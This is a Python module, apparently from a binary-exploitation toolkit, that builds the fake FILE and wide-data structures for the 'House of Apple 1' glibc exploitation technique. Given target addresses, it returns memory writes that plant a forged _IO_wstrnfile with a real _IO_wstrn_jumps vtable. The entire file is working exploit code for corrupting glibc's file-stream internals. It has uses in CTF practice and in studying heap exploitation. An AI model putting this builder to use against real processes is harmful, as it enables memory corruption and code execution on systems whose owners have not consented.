"""House of Apple 1 _IO_wstrn_overflow known-value write plan."""

from __future__ import annotations

from dataclasses import dataclass


UINT64_LIMIT = 1 << 64
FILE_WIDE_DATA = 0xA0
FILE_MODE = 0xC0
FILE_VTABLE = 0xD8
FILE_IMAGE_SIZE = 0xE0
OVERFLOW_BUF_OFFSET = 0xF0
OVERFLOW_BUF_SIZE = 0x100
WIDE_DATA_SIZE = 0x40


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def build_house_of_apple1(
    *,
    fake_file_addr: int,
    wide_data_addr: int,
    wstrn_jumps_addr: int,
    file_mode: int = 1,
) -> tuple[MemoryWrite, ...]:
    """生成 Apple1 的 fake FILE 和八个已知值写入。

    fake_file_addr: fake `_IO_wstrnfile` 起点；wide_data_addr: 目标 `_IO_wide_data`。
    wstrn_jumps_addr: 目标 libc 的合法 `_IO_wstrn_jumps`，必须按 Build ID 解析。
    file_mode: FILE `_mode`，PoC 默认 1 以保持宽字符路径。
    """

    for name, value in {
        "fake_file_addr": fake_file_addr,
        "wide_data_addr": wide_data_addr,
        "wstrn_jumps_addr": wstrn_jumps_addr,
    }.items():
        _check_uint64(name, value)

    if file_mode < 0 or file_mode >= (1 << 32):
        raise ValueError("file_mode must fit uint32")

    known = fake_file_addr + OVERFLOW_BUF_OFFSET
    _check_uint64("known", known)

    wide_data = bytearray(WIDE_DATA_SIZE)
    for offset in (0x00, 0x10, 0x18, 0x20, 0x28, 0x30):
        wide_data[offset:offset + 8] = _pack64(known)
    for offset in (0x08, 0x38):
        wide_data[offset:offset + 8] = _pack64(known + OVERFLOW_BUF_SIZE)

    file_image = bytearray(FILE_IMAGE_SIZE)
    file_image[FILE_WIDE_DATA:FILE_WIDE_DATA + 8] = _pack64(wide_data_addr)
    file_image[FILE_MODE:FILE_MODE + 4] = file_mode.to_bytes(4, "little")
    file_image[FILE_VTABLE:FILE_VTABLE + 8] = _pack64(wstrn_jumps_addr)

    return (
        MemoryWrite(fake_file_addr, bytes(file_image), "fake _IO_wstrnfile"),
        MemoryWrite(wide_data_addr, bytes(wide_data), "Apple1 wide_data known writes"),
    )
